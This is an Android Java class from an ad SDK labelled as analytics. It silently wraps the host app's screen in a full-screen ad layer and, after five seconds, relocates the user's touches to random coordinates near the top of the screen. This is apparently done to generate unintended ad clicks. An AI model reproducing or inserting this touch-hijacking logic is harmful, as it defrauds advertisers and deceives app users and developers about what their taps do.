package com.analytics.sdk.view.strategy.click;

import android.app.Activity;
import android.graphics.Rect;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;

import com.analytics.sdk.R;
import com.analytics.sdk.client.AdClientContext;
import com.analytics.sdk.common.helper.UIHelper;
import com.analytics.sdk.common.log.Logger;
import com.analytics.sdk.common.runtime.ThreadExecutor;
import com.analytics.sdk.helper.SdkHelper;
import com.analytics.sdk.service.ad.entity.AdResponse;
import com.analytics.sdk.service.ad.entity.AdStragegyWorkArgs;
import com.analytics.sdk.view.dispatcher.AdRequestQueue;
import com.analytics.sdk.view.strategy.StrategyRootLayout;

public class StrategyViewAppender {

    static final String TAG = StrategyViewAppender.class.getSimpleName();

    public boolean apply(final Activity activity) {

        try {
            ViewGroup androidContentView = activity.getWindow().getDecorView().findViewById(Window.ID_ANDROID_CONTENT);

            //开发者的view
            View devView = androidContentView.getChildAt(0);
            Logger.i(TAG,"dev view name = " + devView.getClass().getName());

            androidContentView.removeAllViews();

            final View rootView = activity.getLayoutInflater().inflate(R.layout.jhsdk_video_with_gdt_and_csj_click_strategy_layout,androidContentView);
            final StrategyRootLayout adContainer = rootView.findViewById(R.id.ad_root_layout);

            //向开发者view添加一层
            adContainer.addView(devView);

            ThreadExecutor.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {

                        final Rect hitRect = new Rect(0,0,AdClientContext.displayWidth,AdClientContext.displayHeight);

                        adContainer.setViewSize(AdClientContext.displayWidth,AdClientContext.displayHeight);
                        adContainer.setHitRect(hitRect);
                        AdResponse adResponse = AdRequestQueue.getDefault().topResponse();
                        if(adResponse == null) {
                            Logger.i(TAG,"adResponse not found");
                            return;
                        }
                        adContainer.setAdResponse(adResponse);

                        Logger.i(TAG,"adContainer w = " + adContainer.getWidth() + "  , h = " + adContainer.getHeight());

                        final int margin = UIHelper.dip2px(adContainer.getContext(),20);

//                final int offsetX = SdkHelper.getRandom(margin, AdClientContext.displayWidth - margin);
//                final int offsetY = SdkHelper.getRandom((AdClientContext.displayHeight / 4),AdClientContext.displayHeight - margin);

                        adContainer.setTouchEventRelocationable(new AdStragegyWorkArgs.TouchEventRelocationable() {
                            @Override
                            public int getRelocationX() {
                                return SdkHelper.getRandom(margin, AdClientContext.displayWidth - margin);
                            }

                            @Override
                            public int getRelocationY() {
                                return SdkHelper.getRandom(margin,100);
                            }
                        });

                        new ClickRandomDebugHelper().apply(adContainer,hitRect,adResponse);

                    } catch (Exception e){
                        e.printStackTrace();
                    }

                }
            },5*1000);
            return true;
        } catch (Exception e){
            e.printStackTrace();
            return false;
        }


    }

}
